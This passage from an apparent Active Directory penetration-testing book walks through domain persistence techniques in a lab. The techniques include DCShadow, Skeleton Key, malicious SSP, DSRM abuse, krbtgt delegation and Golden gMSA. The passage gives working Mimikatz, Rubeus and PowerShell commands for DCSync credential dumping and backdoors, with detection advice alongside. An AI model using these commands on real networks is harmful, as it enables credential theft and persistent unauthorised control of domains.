<p>The main<a id="_idIndexMarker627"/> concept of this attack is to set the <strong class="source-inline">UF_SERVER_TRUST_ACCOUNT</strong> bit in the userAccountControl attribute of a computer. Then, AD must set the <strong class="source-inline">primaryGroupId</strong> attribute of this computer to the RID of the domain controllers’ group. To perform such actions, we need domain administrator privileges. This can be done manually or with the help of a PowerShell script developed by <em class="italic">Stealthbits</em>[6]. The script has three functions. The first command will create a computer object and grant the <strong class="source-inline">Authenticated Users</strong> group <strong class="source-inline">Ds-Install-Replica</strong> and <strong class="source-inline">Write</strong> permissions <span class="No-Break">on it:</span></p>
<pre class="console">
Add-ServerUntrustAccount -ComputerName Desktop -Password "Qwerty123!" -Verbose</pre> <p>When an adversary<a id="_idIndexMarker628"/> needs to regain domain dominance, then a second function has to be invoked. It will set the userAccountControl value to <strong class="source-inline">8192</strong> (<strong class="source-inline">SERVER_TRUST_ACCOUNT</strong>), use Mimikatz to execute a pass-the-hash attack as a computer account, and finally, <span class="No-Break">perform DCSync:</span></p>
<pre class="console">
Invoke-ServerUntrustAccount -ComputerName Desktop -Password "Qwerty123!" -MimikatzPath "C:\Users\robert.baratheon\Downloads\mimikatz_trunk\x64\mimikatz.exe" -Verbose</pre> <p>The third function is <span class="No-Break">for cleanup:</span></p>
<pre class="console">
Remove-ServerUntrustAccount -ComputerName Desktop -DeleteComputer</pre> <p>A full attack chain execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer187">
<img alt="Figure 7.18 – A server trust account attack" height="536" src="image/B18964_07_18.jpg" width="841"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.18 – A server trust account attack</p>
<p>This <a id="_idIndexMarker629"/>attack creates quite a significant foothold, starting from computer account creation and unusual ACLs on this account, going further with pass-the-hash lateral movement, and finally, a DCSync attack. Later, we will explain the most dangerous user privilege that you may never have <span class="No-Break">heard of.</span></p>
<h3>SeEnableDelegationPrivilege</h3>
<p>The main<a id="_idIndexMarker630"/> idea here is to control an object with the <strong class="source-inline">SeEnableDelegationPrivilege</strong> user right, and if it has <strong class="source-inline">GenericAll</strong> or <strong class="source-inline">GenericWrite</strong> permissions over any user or computer in the domain, the attacker will achieve domain persistence. Surprisingly, the <strong class="source-inline">GenericAll</strong> permission is not enough to modify the delegation settings of the account, which is why the <strong class="source-inline">SeEnableDelegationPrivilege</strong> right is required. By default, this privilege is applicable only to a domain <span class="No-Break">controller itself.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">This technique was discovered by <em class="italic">harmj0y</em> and is well described <span class="No-Break">here: </span><a href="https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/"><span class="No-Break">https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/</span></a><span class="No-Break">.</span></p>
<p>As the<a id="_idIndexMarker631"/> first step, we must grant this right to <a id="_idIndexMarker632"/>our backdoor user by editing the <strong class="bold">Default Domain Controllers</strong> policy, located in <strong class="source-inline">\\sevenkingdoms.local\sysvol\sevenkingdoms.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</strong>. Then, we abuse our <strong class="source-inline">GenericAll</strong> or <strong class="source-inline">GenericWrite</strong> permissions over the victim user to set the <strong class="source-inline">msDS-AllowedToDelegateTo</strong> value to point to our target service. <strong class="source-inline">GenericWrite</strong> will require the knowledge of the victim’s secret during exploitation, and <strong class="source-inline">GenericAll</strong> will allow us to change the password. As a last step, we abuse the constrained delegation in the same way we did during lateral movement. To prepare our lab for the attack demonstration, I will grant the <strong class="source-inline">tywin.lannister</strong> user account the <strong class="source-inline">GenericAll</strong> right on the <strong class="source-inline">renly.baratheon</strong> account via the ADSI edit, in the same way we did in the <span class="No-Break">previous chapter.</span></p>
<p>As a domain administrator, the attacker can manually add <strong class="source-inline">tywin.lannister</strong> to the aforementioned Group Policy. The following PowerView commands will confirm that all the prerequisites <span class="No-Break">are fulfilled:</span></p>
<pre class="console">
$policy = Get-DomainPolicy -Source DC
$policy.PrivilegeRights.SeEnableDelegationPrivilege
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -eq 'tywin.lannister'}</pre> <p>The result is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer188">
<img alt="Figure 7.19 – The tywin.lannister user has all the necessary rights for the attack" height="457" src="image/B18964_07_19.jpg" width="728"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.19 – The tywin.lannister user has all the necessary rights for the attack</p>
<p>Now, we <a id="_idIndexMarker633"/>set the <strong class="source-inline">msDS-AllowedToDelegateTo</strong> property and the userAccountControl flag of the <strong class="source-inline">renly.baratheon</strong> user account with the <span class="No-Break">following commands:</span></p>
<pre class="console">
Set-DomainObject -Identity renly.baratheon -Set @{"msds-allowedtodelegateto"="http/kingslanding.sevenkingdoms.local"} -Verbose
Set-DomainObject -Identity renly.baratheon -Xor @{"useraccountcontrol"="16777216"} -Verbose
Get-DomainObject -Identity renly.baratheon | select msds-allowedtodelegateto, useraccountcontrol | fl</pre> <p>Successful execution of the preceding commands can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer189">
<img alt="Figure 7.20 – Successfully set required user attributes" height="251" src="image/B18964_07_20.jpg" width="1035"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.20 – Successfully set required user attributes</p>
<p>As a last step, we <a id="_idIndexMarker634"/>will abuse constrained delegation in the same way we did in <a href="B18964_05.xhtml#_idTextAnchor093"><span class="No-Break"><em class="italic">Chapter 5</em></span></a><span class="No-Break">.</span></p>
<p>From a defense perspective, such user privileges must be monitored alongside changes in GPOs. The final backdooring technique will also rely on delegation, but this time, it is RBCD on the <span class="No-Break">krbtgt account.</span></p>
<h3>Delegation on krbtgt</h3>
<p>The idea<a id="_idIndexMarker635"/> behind this technique is to abuse RBCD on the krbtgt account. With built-in domain administrator group privileges, an attacker can set the <strong class="source-inline">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute of the krbtgt account. The adversary will be able to obtain a service ticket for the krbtgt service on behalf of any user. Effectively, it is a TGT of the impersonated user. This trick won’t work for members of the <strong class="source-inline">Protected Users</strong> group and accounts with the <strong class="bold">Account is sensitive and cannot be delegated</strong> flag enabled. The attacker will set up the backdoor by creating or using an existing computer account and, with the help of the AD Module, configure the <strong class="source-inline">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute of the <span class="No-Break">krbtgt account:</span></p>
<pre class="console">
StandIn_v13_Net45.exe --computer legit --make
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount legit$ -Verbose
Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</pre> <p>The result of the preceding commands can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer190">
<img alt="Figure 7.21 – A successfully set msDS-AllowedToActOnBehalfOfOtherIdentity attribute of krbtgt" height="342" src="image/B18964_07_21.jpg" width="785"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.21 – A successfully set msDS-AllowedToActOnBehalfOfOtherIdentity attribute of krbtgt</p>
<p>To utilize<a id="_idIndexMarker636"/> the backdoor as a low-privileged user, the attacker requests a service ticket for the krbtgt service and performs a DCSync attack, <span class="No-Break">as follows:</span></p>
<pre class="console">
Rubeus.exe hash /password:QMgbL9WpzfRgSrr
Rubeus.exe s4u /nowrap /impersonateuser:Administrator /msdsspn:krbtgt /domain:sevenkingdoms.local /user:legit$ /rc4:56E24C7AD8CCD68A1868CBFFA14B7CD1
Rubeus.exe asktgs /service:"ldap/kingslanding.sevenkingdoms.local" /ptt /ticket:"from_s4u_base64"
mimikatz.exe "lsadump::dcsync /csv /all" "exit"</pre> <p>The result of the preceding command execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer191">
<img alt="Figure 7.22 – A DCSync attack as a result of delegation on the krbtgt account" height="604" src="image/B18964_07_22.jpg" width="811"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.22 – A DCSync attack as a result of delegation on the krbtgt account</p>
<p>From a <a id="_idIndexMarker637"/>defensive perspective, the only way to detect this technique is to monitor changes to the krbtgt account attributes. Now that we are done with attributes and ACL modifications, we explain a rogue domain <span class="No-Break">controller attack.</span></p>
<h2 id="_idParaDest-139"><a id="_idTextAnchor154"/>DCShadow</h2>
<p>A DCShadow attack <a id="_idIndexMarker638"/>allows you to create a fake domain <a id="_idIndexMarker639"/>controller and push changes to AD objects. Beware that pushing data using replication can brick <span class="No-Break">your domain.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">This attack was presented by <em class="italic">Vincent Le Toux</em> and <em class="italic">Benjamin Delpy</em> (<a href="https://www.dcshadow.com/">https://www.dcshadow.com/</a>) <span class="No-Break">in 2018.</span></p>
<p>DCShadow requires domain administrator privileges to replicate changes and <strong class="source-inline">SYSTEM</strong> privileges on a compromised host, allowing you to implement fake domain controller functionality. The attack steps described by Le Toux and Delpy are <span class="No-Break">as follows:</span></p>
<ol>
<li>Register the domain controller by creating two objects in the <strong class="source-inline">CN=Configuration</strong> partition, and alter the SPN of the <span class="No-Break">computer used.</span></li>
<li>Push the data by triggering <strong class="source-inline">DrsReplicaAdd</strong>, KCC, or other internal <span class="No-Break">AD events.</span></li>
<li>Remove the object previously created to demote the <span class="No-Break">domain controller.</span></li>
</ol>
<p>Our <a id="_idIndexMarker640"/>attack plan is the following: we will add the privileged SID of <strong class="source-inline">daenerys.targaryen</strong>, who is a domain administrator, to the SIDHistory attribute of the low-privileged <strong class="source-inline">viserys.targaryen</strong> user account. On <strong class="source-inline">meereen.essos.local</strong>, we logged in as <strong class="source-inline">daenerys.targaryen</strong>, who has domain administrator privileges in the <strong class="source-inline">essos.local</strong> domain. We have to run the following Mimikatz commands <span class="No-Break">as </span><span class="No-Break"><strong class="source-inline">SYSTEM</strong></span><span class="No-Break">:</span></p>
<pre class="console">
!+
!processtoken
lsadump::dcshadow /object:viserys.targaryen /attribute:sidhistory /value:S-1-5-21-2801885930-3847104905-347266793-1110</pre> <p>The result of the execution is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer192">
<img alt="Figure 7.23 – DCShadow adds the SIDHistory attribute" height="1017" src="image/B18964_07_23.jpg" width="1043"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.23 – DCShadow adds the SIDHistory attribute</p>
<p>The following<a id="_idIndexMarker641"/> Mimikatz commands should be run with the domain <span class="No-Break">administrator privileges:</span></p>
<pre class="console">
token::whoami
lsadump::dcshadow /push</pre> <p>Attribute replication is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer193">
<img alt="Figure 7.24 – DCShadow replicates the SIDHistory attribute on the domain controller" height="493" src="image/B18964_07_24.jpg" width="1008"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.24 – DCShadow replicates the SIDHistory attribute on the domain controller</p>
<p>As a <a id="_idIndexMarker642"/>result, <strong class="source-inline">viserys.targaryen</strong> has the <strong class="source-inline">SIDHistory</strong> attribute added and now has access to the <span class="No-Break">domain controller:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer194">
<img alt="Figure 7.25 – DCShadow results in a privileged SID added to viserys.targaryen" height="447" src="image/B18964_07_25.jpg" width="584"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.25 – DCShadow results in a privileged SID added to viserys.targaryen</p>
<p>Detection can be done by network traffic monitoring or correlating events from a domain controller. The blue team can monitor incoming replication traffic with certain API calls that<a id="_idIndexMarker643"/> didn’t originate from the domain controller. In the domain controller’s security log, defenders can examine the series of events with the ID <strong class="source-inline">4662</strong>, with a sequence of <strong class="source-inline">CreateChild</strong>, <strong class="source-inline">Control Access</strong>, and <strong class="source-inline">Delete</strong> accessed in a short period of time. An example of a logged malicious event is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer195">
<img alt="Figure 7.26 – Rogue domain controller object creation" height="491" src="image/B18964_07_26.jpg" width="787"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.26 – Rogue domain controller object creation</p>
<p>Another option to achieve persistence is to set the minimum permissions required for DCShadow on an AD object, with the help of a script <span class="No-Break">from </span><span class="No-Break"><em class="italic">Nishang</em></span><span class="No-Break">[7].</span></p>
<p>Our last domain-level persistence technique, called the Golden gMSA attack, allows a privileged attacker to compute the gMSA’s password in the domain and <span class="No-Break">forest offline.</span></p>
<h2 id="_idParaDest-140"><a id="_idTextAnchor155"/>Golden gMSA</h2>
<p>Let us <a id="_idIndexMarker644"/>recall <a id="_idIndexMarker645"/>that gMSA is used for automatic password rotation on service accounts to mitigate attacks such as Kerberoasting. We evaluated the security of this solution in <a href="B18964_04.xhtml#_idTextAnchor061"><span class="No-Break"><em class="italic">Chapter 4</em></span></a>. The Golden gMSA attack was first presented by <em class="italic">Yuval Gordon</em> from a company called Semperis. The idea is that an attacker with the ability to dump a <strong class="bold">Key Distribution Service</strong> (<strong class="bold">KDS</strong>) root key<a id="_idIndexMarker646"/> with additional attributes can compute gMSA’s <span class="No-Break">password offline.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">The original research can be found <span class="No-Break">here: </span><a href="https://www.semperis.com/blog/golden-gmsa-attack/"><span class="No-Break">https://www.semperis.com/blog/golden-gmsa-attack/</span></a><span class="No-Break">.</span></p>
<p>Using<a id="_idIndexMarker647"/> the <strong class="bold">GoldenGMSA</strong>[8] tool, an adversary can calculate<a id="_idIndexMarker648"/> the gMSA password offline because it is derived from the KDS root key and several other attributes. An adversary needs to run three commands to obtain the password in the <strong class="source-inline">base64</strong> format. The first command will list all the available gMSAs, the second will dump the corresponding KDS root key and other attributes, and the third will compute the gMSA password using the output of the first <span class="No-Break">two commands:</span></p>
<pre class="console">
GoldenGMSA.exe gmsainfo
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe compute --sid S-1-5-21-2801885930-3847104905-347266 793-1115 --kdskey &lt;kds_from_step_2&gt; --pwdid AQAAAEtEU0sCAAAA aQEAAAYAAAACAAAAVXiD+faLnEL66hoQ7gimmwAAAAAYAAAAGAAAAGUAcwBzAG8 AcwAuAGwAbwBjAGEAbAAAAGUAcwBzAG8AcwAuAGwAbwBjAGEAbAAAAA==</pre> <p>The successful Golden gMSA attack is <span class="No-Break">demonstrated here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer196">
<img alt="Figure 7.27 – Retrieving a gMSA password using a Golden gMSA attack" height="706" src="image/B18964_07_27.jpg" width="960"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.27 – Retrieving a gMSA password using a Golden gMSA attack</p>
<p>It’s<a id="_idIndexMarker649"/> important to mention that there is only one KDS root <a id="_idIndexMarker650"/>key; however, all other values to calculate gMSA are different, meaning that every password needs to be <span class="No-Break">dumped separately.</span></p>
<p>From a defensive point of view, additional auditing must be enabled to detect KDS root key <span class="No-Break">dumping attempts.</span></p>
<p>This section about domain persistence focused on domain-level dominance. However, there are other ways to backdoor AD by abusing different authentication mechanisms and permissions on the domain <span class="No-Break">controller itself.</span></p>
<h1 id="_idParaDest-141"><a id="_idTextAnchor156"/>Domain controller persistence</h1>
<p>The domain controller<a id="_idIndexMarker651"/> in a Windows environment remains one of the key objectives for malicious actors during their campaigns. If an adversary has compromised the domain controller and established persistence, it is possible to regain domain-wide administrative privileges in a matter of minutes. Techniques in this section utilize credential manipulation and authentication mechanism alteration. At the end of this section, we will explain the concept of security descriptors and how attackers can modify them to maintain privileged access in <span class="No-Break">an environment.</span></p>
<h2 id="_idParaDest-142"><a id="_idTextAnchor157"/>Skeleton Key</h2>
<p>A<a id="_idIndexMarker652"/> Skeleton Key attack is a persistence method<a id="_idIndexMarker653"/> on a domain controller that sets a master password in the domain, allowing an adversary to authenticate as any domain user. However, to avoid early detection, an installed backdoor module allows users to continue to log in with their existing passwords as well. For Kerberos authentication to work, encryption downgrade to <strong class="source-inline">RC4_HMAC_MD5</strong> is enforced. This attack requires the domain administrator privileges and the <strong class="source-inline">SeDebugPrivilege</strong> user right on the domain controller. A Skeleton Key attack can’t survive a reboot, as <a id="_idIndexMarker654"/>all manipulations with the <strong class="bold">Local Security Authority Subsystem Service</strong> (<strong class="bold">LSASS</strong>) process are conducted <span class="No-Break">in memory.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A more detailed description of Skeleton Key in-memory actions can be found <span class="No-Break">here: </span><a href="https://adsecurity.org/?p=1255"><span class="No-Break">https://adsecurity.org/?p=1255</span></a><span class="No-Break">.</span></p>
<p>Mimikatz has this attack under its belt. The following command injects Skeleton <span class="No-Break">Key malware:</span></p>
<pre class="console">
mimikatz.exe „privilege::debug" „misc::skeleton" „exit"</pre> <p>The following shows a successful attack on the <span class="No-Break">domain controller:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer197">
<img alt="Figure 7.28 – Skeleton Key malware was deployed on a domain controller" height="355" src="image/B18964_07_28.jpg" width="889"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.28 – Skeleton Key malware was deployed on a domain controller</p>
<p>Now, to <a id="_idIndexMarker655"/>confirm, we map the <strong class="source-inline">C:\</strong> drive <a id="_idIndexMarker656"/>of the domain controller without knowing the privileged <span class="No-Break">user password:</span></p>
<pre class="console">
net use Y: \\kingslanding.sevenkingdoms.local\c$ mimikatz /user:sevenkingdoms\robert.baratheon</pre> <p>The disk was <span class="No-Break">successfully mapped:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer198">
<img alt="Figure 7.29 – The Skeleton Key works" height="39" src="image/B18964_07_29.jpg" width="962"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.29 – The Skeleton Key works</p>
<p>To partially mitigate the Skeleton Key attack, we run LSASS as a protected process by creating the <strong class="source-inline">DWORD</strong> value, <strong class="source-inline">RunAsPPL</strong>, set to <strong class="source-inline">1</strong> in the <strong class="source-inline">HKLM\SYSTEM\CurrentControlSet\Control\Lsa</strong> registry key. As stated by Microsoft, “<em class="italic">This will prevent non-administrative non-PPL processes from accessing or tampering with code and data in a PPL process via open </em><span class="No-Break"><em class="italic">process functions.</em></span><span class="No-Break">”</span></p>
<p>In the following screenshot, we can see that the original Skeleton Key <span class="No-Break">attack failed:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer199">
<img alt="Figure 7.30 – PPL beats the Skeleton Key attack" height="373" src="image/B18964_07_30.jpg" width="968"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.30 – PPL beats the Skeleton Key attack</p>
<p>However, it is<a id="_idIndexMarker657"/> still possible to bypass the PPL <a id="_idIndexMarker658"/>mechanism by removing it from the process, with the help of the <strong class="source-inline">mimidrv.sys</strong> driver from Mimikatz. However, it is much noisier, as such a bypass requires driver loading and <span class="No-Break">service creation:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer200">
<img alt="Figure 7.31 – PPL protection removed by mimidrv" height="522" src="image/B18964_07_31.jpg" width="597"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.31 – PPL protection removed by mimidrv</p>
<p class="callout-heading">Note</p>
<p class="callout">There are other bypasses for PPL, well described by <em class="italic">itm4n</em> <span class="No-Break">here: </span><a href="https://itm4n.github.io/lsass-runasppl/"><span class="No-Break">https://itm4n.github.io/lsass-runasppl/</span></a><span class="No-Break">.</span></p>
<p>Also, the blue <a id="_idIndexMarker659"/>team can enable audit <a id="_idIndexMarker660"/>mode for the LSASS process using Group Policy. It will be possible to monitor plugins and drivers loaded by LSASS, and events <strong class="source-inline">3033</strong> and <strong class="source-inline">3063</strong> will respectively appear in logs. To enable auditing, we need to create the <strong class="source-inline">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</strong> key, with the <strong class="source-inline">AuditLevel</strong> DWORD value set to <strong class="source-inline">8</strong>. When Skeleton Key attack is performed remotely, the domain controller will log events with IDs <strong class="source-inline">4673</strong>, <strong class="source-inline">4611</strong>, <strong class="source-inline">4688</strong>, and <strong class="source-inline">4689</strong>, as described here[9]. These events will show the usage of sensitive privileges the and registration of a logon process. The last two events will appear only if <strong class="bold">Process Tracking</strong> <span class="No-Break">is enabled.</span></p>
<p>To further explore how authentication mechanisms can be altered, we will introduce the concept of a <span class="No-Break">malicious SSP.</span></p>
<h2 id="_idParaDest-143"><a id="_idTextAnchor158"/>A malicious SSP</h2>
<p><strong class="bold">Security Support Provider Interface</strong> (<strong class="bold">SSPI</strong>) is <a id="_idIndexMarker661"/>the basis for Windows authentication. When<a id="_idIndexMarker662"/> applications need to authenticate <a id="_idIndexMarker663"/>via a specific protocol, they use SSPI to invoke the corresponding SSPs. There are six default SSPs implemented as DLLs, located in the <strong class="source-inline">C:\Windows\System32</strong> folder. Custom SSPs can be introduced as well. A list of providers is stored in the registry key at <span class="No-Break"><strong class="source-inline">HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</strong></span><span class="No-Break">.</span></p>
<p>With administrative privileges on a compromised host, an adversary has two options. The first one is to utilize Mimikatz to inject a malicious SSP directly into the LSASS process. The second option is to update the SSP Security Packages registry key, drop <strong class="source-inline">mimilib.dll</strong> in the same folder as LSASS (<strong class="source-inline">C:\Windows\System32</strong>), and wait for a reboot. Both venues have their own obvious OpSec considerations. An in-memory injection scenario will not survive the reboot but will start logging passwords immediately. The <strong class="source-inline">memssp</strong> module from Mimikatz can be injected with the <span class="No-Break">following command:</span></p>
<pre class="console">
mimikatz.exe „privilege::debug" „misc::memssp" „exit"</pre> <p>The result of the <a id="_idIndexMarker664"/>successful injection of a malicious SSP is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer201">
<img alt="Figure 7.32 – The Mimikatz memssp module is injected" height="277" src="image/B18964_07_32.jpg" width="869"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.32 – The Mimikatz memssp module is injected</p>
<p>We can<a id="_idIndexMarker665"/> lock the screen with the <strong class="source-inline">misc::lock</strong> Mimikatz command, so the victim will have to log in again. The log file with the passwords is located in <strong class="source-inline">C:\Windows\System32\mimilsa.log</strong>, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer202">
<img alt="Figure 7.33 – Clear-text passwords in the mimilsa.log file" height="314" src="image/B18964_07_33.jpg" width="649"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.33 – Clear-text passwords in the mimilsa.log file</p>
<p>To manually add an SSP via the registry, run the <span class="No-Break">following command:</span></p>
<pre class="console">
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f</pre> <p>The <a id="_idIndexMarker666"/>successful SSP addition of <strong class="source-inline">mimilib</strong> is <span class="No-Break">demonstrated here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer203">
<img alt="Figure 7.34 – mimilib was registered as an SSP" height="107" src="image/B18964_07_34.jpg" width="712"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.34 – mimilib was registered as an SSP</p>
<p>After<a id="_idIndexMarker667"/> reboot, the passwords can be found <span class="No-Break">in </span><span class="No-Break"><strong class="source-inline">C:\Windows\System32\kiwissp.log</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer204">
<img alt="Figure 7.35 – Clear-text passwords in the kiwissp.log file" height="193" src="image/B18964_07_35.jpg" width="736"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.35 – Clear-text passwords in the kiwissp.log file</p>
<p>To detect a malicious SSP, the blue team can monitor the changes of the <strong class="source-inline">HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</strong> registry key and files on the disk. However, adversaries can change the log storage folder and log filename. In the case of LSASS injection, we can apply the same detections as we discussed previously. Also, it is recommended to run LSASS <span class="No-Break">as PPL.</span></p>
<p>To finalize our persistence through authentication manipulation, we will cover local administrator account abuse on a <span class="No-Break">domain controller.</span></p>
<h2 id="_idParaDest-144"><a id="_idTextAnchor159"/>DSRM</h2>
<p>A <strong class="bold">Directory Services Restore Mode</strong> (<strong class="bold">DSRM</strong>) account <a id="_idIndexMarker668"/>is a local administrator account on a <a id="_idIndexMarker669"/>domain controller. This account has a different password from the domain administrator. This password is set during domain controller promotion and is very often overlooked during the password rotation routine. There are two attack scenarios well described by <em class="italic">Sean Metcalf</em>. One is changing the DSRM password to a known one, and the other is to sync it with the domain account of our choice. We will utilize <strong class="source-inline">Ntdsutil</strong> for these actions. Both scenarios are shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer205">
<img alt="Figure 7.36 – The DSRM password reset and sync scenarios" height="277" src="image/B18964_07_36.jpg" width="612"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.36 – The DSRM password reset and sync scenarios</p>
<p>We can confirm that the sync was successful by dumping and comparing the <span class="No-Break">user hashes:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer206">
<img alt="Figure 7.37 – The DSRM password was synced with jaime.lannister’s account password" height="438" src="image/B18964_07_37.jpg" width="565"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.37 – The DSRM password was synced with jaime.lannister’s account password</p>
<p>There are<a id="_idIndexMarker670"/> three possible scenarios when logging in with the DSRM password. With Domain Administrator’s privileges, an attacker can force the desired option by setting the registry key value in <strong class="source-inline">HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</strong> to one of <span class="No-Break">the following:</span></p>
<ul>
<li><strong class="bold">0 (default)</strong>: Login is allowed only when a domain controller is <span class="No-Break">in DSRM</span></li>
<li><strong class="bold">1</strong>: Login is allowed only when directory services <span class="No-Break">is stopped</span></li>
<li><strong class="bold">2</strong>: Free to log in without <span class="No-Break">any limitations</span></li>
</ul>
<p>Using PowerShell, the adversary will set the registry value <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">2</strong></span><span class="No-Break">:</span></p>
<pre class="console">
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD</pre> <p>Then, the attacker will perform a pass-the-hash attack to spawn the shell as the domain controller’s local administrator and run a <span class="No-Break">DCSync attack:</span></p>
<pre class="console">
mimikatz.exe "lsadump::dcsync /domain:sevenkingdoms.local /dc:kingslanding /user:robert.baratheon /csv"</pre> <p>The DCSync results are <span class="No-Break">demonstrated here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer207">
<img alt="Figure 7.38 – The DCSync results from the DSRM login session" height="264" src="image/B18964_07_38.jpg" width="963"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.38 – The DCSync results from the DSRM login session</p>
<p>The <a id="_idIndexMarker671"/>blue team should monitor the existence of the <strong class="source-inline">HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior</strong> registry key. Event ID <strong class="source-inline">4794</strong> will log an attempt to set the <span class="No-Break">DSRM password.</span></p>
<p>Our last persistence technique will cover security descriptors and how they can be set in order to provide privileged access for a malicious actor, without explicitly adding a compromised user to a <span class="No-Break">privileged group.</span></p>
<h2 id="_idParaDest-145"><a id="_idTextAnchor160"/>Security descriptor alteration</h2>
<p>A<a id="_idIndexMarker672"/> security descriptor is used to<a id="_idIndexMarker673"/> store permissions that one object has over another. It is described using<a id="_idIndexMarker674"/> the format defined in <a id="_idIndexMarker675"/>the <strong class="bold">Security Descriptor Definition Language</strong> (<strong class="bold">SDDL</strong>). <strong class="bold">Access Control Entity</strong> (<strong class="bold">ACE</strong>) strings<a id="_idIndexMarker676"/> are<a id="_idIndexMarker677"/> used for <strong class="bold">Discretionary Access Control List</strong> (<strong class="bold">DACL</strong>) and <strong class="bold">System Access Control </strong><span class="No-Break"><strong class="bold">List</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">SACL</strong></span><span class="No-Break">)[10]:</span></p>
<pre class="console">
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;</pre> <p>The idea is to modify the security descriptors of multiple remote access methods. We will set a backdoor for WMI and PS-Remoting access on a domain controller for non-privileged users. Also, we will alter the security descriptors for the remote registry. The RACE toolkit has PowerShell functions for <span class="No-Break">these tasks:</span></p>
<pre class="console">
Set-RemoteWMI -SamAccountName renly.baratheon -ComputerName kingslanding -Verbose
Set-RemotePSRemoting -SamAccountName renly.baratheon -Verbose
Add-RemoteRegBackdoor -Trustee renly.baratheon -ComputerName kingslanding -Verbose</pre> <p>The <a id="_idIndexMarker678"/>result<a id="_idIndexMarker679"/> of the command execution on the domain controller is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer208">
<img alt="Figure 7.39 – Setting backdoors on the domain controller for user renly.baratheon" height="1108" src="image/B18964_07_39.jpg" width="1125"/>
</div>
</div>
